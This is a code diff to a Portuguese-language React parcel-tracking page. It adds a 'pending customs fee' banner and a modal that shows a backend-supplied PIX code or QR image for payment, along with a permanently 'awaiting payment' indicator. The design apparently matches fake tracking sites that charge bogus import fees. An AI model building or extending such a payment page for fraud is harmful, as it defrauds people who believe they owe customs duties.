@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle } from 'lucide-react';
+import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle, Calculator } from 'lucide-react';
 import { useSearchParams } from 'react-router-dom';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
@@ -12,6 +12,10 @@ const TrackingPage: React.FC = () => {
     const [trackingData, setTrackingData] = useState<any>(null);
     const [loading, setLoading] = useState(false);
     const [showExpressModal, setShowExpressModal] = useState(false);
+    const [showTaxModal, setShowTaxModal] = useState(false);
+
+    // Dados da Taxa Adicional (se houver)
+    const [taxData, setTaxData] = useState<{ valor: string | null; pix: string | null } | null>(null);
 
     // PixGo Integration State
     const [pixLoading, setPixLoading] = useState(false);
@@ -100,9 +104,16 @@ const TrackingPage: React.FC = () => {
                             icon: icon
                         };
                     }),
-                    etapaAtual: data.etapas.length
+                    etapaAtual: data.etapas.length,
+                    taxa_valor: data.taxa_valor,
+                    taxa_pix: data.taxa_pix
                 };
                 setTrackingData(mappedData);
+                if (data.taxa_valor && data.taxa_pix) {
+                    setTaxData({ valor: data.taxa_valor, pix: data.taxa_pix });
+                } else {
+                    setTaxData(null);
+                }
             } else {
                 alert(data.message || 'Código não encontrado ou erro na busca.');
             }
@@ -202,6 +213,46 @@ const TrackingPage: React.FC = () => {
                 {trackingData ? (
                     <div className="reveal">
                         <div className="status-card">
+                            {trackingData.taxa_valor && (
+                                <div style={{
+                                    background: 'rgba(239, 68, 68, 0.1)',
+                                    border: '1px solid rgba(239, 68, 68, 0.2)',
+                                    borderRadius: '20px',
+                                    padding: '20px',
+                                    marginBottom: '32px',
+                                    display: 'flex',
+                                    alignItems: 'center',
+                                    justifyContent: 'space-between',
+                                    gap: '16px'
+                                }} className="reveal">
+                                    <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                                        <div style={{ width: '40px', height: '40px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                                            <Calculator size={20} color="#ef4444" />
+                                        </div>
+                                        <div>
+                                            <div style={{ color: '#ef4444', fontWeight: 800, fontSize: '0.9rem', textTransform: 'uppercase' }}>Taxa Pendente</div>
+                                            <div style={{ color: 'rgba(255,255,255,0.6)', fontSize: '0.85rem' }}>Seu pedido aguarda o pagamento da taxa alfandegária.</div>
+                                        </div>
+                                    </div>
+                                    <button
+                                        onClick={() => setShowTaxModal(true)}
+                                        style={{
+                                            background: '#ef4444',
+                                            color: '#fff',
+                                            border: 'none',
+                                            padding: '10px 20px',
+                                            borderRadius: '12px',
+                                            fontWeight: 800,
+                                            fontSize: '0.9rem',
+                                            cursor: 'pointer',
+                                            boxShadow: '0 4px 12px rgba(239, 68, 68, 0.3)'
+                                        }}
+                                    >
+                                        Pagar R$ {trackingData.taxa_valor}
+                                    </button>
+                                </div>
+                            )}
+
                             <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '40px' }}>
                                 <div>
                                     <div style={{ display: 'inline-flex', padding: '6px 16px', background: 'rgba(52, 211, 153, 0.1)', border: '1px solid rgba(52, 211, 153, 0.2)', borderRadius: '100px', fontSize: '0.8rem', fontWeight: 800, color: '#34d399', marginBottom: '12px' }}>{trackingData.status}</div>
@@ -258,6 +309,51 @@ const TrackingPage: React.FC = () => {
             </div>
 
             <Footer />
+
+            {/* Modal Taxa */}
+            {showTaxModal && taxData && (
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => setShowTaxModal(false)}>
+                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
+                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
+                            <Calculator size={40} color="#ef4444" />
+                        </div>
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Pagar Taxa</h2>
+                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
+                            Para liberar seu pacote do centro de fiscalização, realize o pagamento da taxa de importação de <strong>R$ {taxData.valor}</strong>.
+                        </p>
+
+                        <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
+                            <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
+                            <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
+                                R$ {taxData.valor}
+                            </div>
+
+                            {/* Se o pix for um link de imagem, mostra imagem, senão o código */}
+                            {taxData.pix?.startsWith('http') ? (
+                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
+                                    <img src={taxData.pix} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
+                                </div>
+                            ) : (
+                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all', minHeight: '60px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                                    {taxData.pix}
+                                </div>
+                            )}
+
+                            <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Utilize seu banco para pagar o PIX acima.</p>
+                            <button onClick={() => {
+                                if (taxData.pix) {
+                                    navigator.clipboard.writeText(taxData.pix);
+                                    alert('Código PIX copiado!');
+                                }
+                            }} style={{ padding: '8px 16px', background: '#ef4444', border: 'none', borderRadius: '8px', color: 'white', cursor: 'pointer', fontSize: '0.9rem', fontWeight: 700 }}>Copiar Código</button>
+
+                            <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
+                        </div>
+
+                        <button onClick={() => setShowTaxModal(false)} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>Voltar</button>
+                    </div>
+                </div>
+            )}
 
             {/* Modal Acelerar */}
             {showExpressModal && (
